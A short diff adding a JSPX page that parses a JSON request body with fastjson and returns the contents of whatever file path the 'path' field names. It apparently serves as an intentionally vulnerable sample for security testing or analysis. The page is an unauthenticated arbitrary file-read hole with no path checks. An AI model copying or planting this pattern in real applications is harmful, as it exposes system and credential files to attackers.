@@ -1,0 +1,18 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" version="1.2">
+    <jsp:directive.page import="com.alibaba.fastjson.JSON"/>
+    <jsp:directive.page import="com.alibaba.fastjson.TypeReference"/>
+    <jsp:directive.page import="java.nio.file.Files"/>
+    <jsp:directive.page import="java.nio.file.Paths"/>
+    <jsp:directive.page import="java.util.Map"/>
+    <jsp:scriptlet>
+        Map&lt;String, Object> json = JSON.parseObject(
+                request.getInputStream(), new TypeReference&lt;Map&lt;String, Object>>() {
+                }.getType()
+        );
+
+        String path = (String) json.get("path");
+
+        byte[] bytes = Files.readAllBytes(Paths.get(path));
+        out.println(new String(bytes));
+    </jsp:scriptlet>
+</jsp:root>
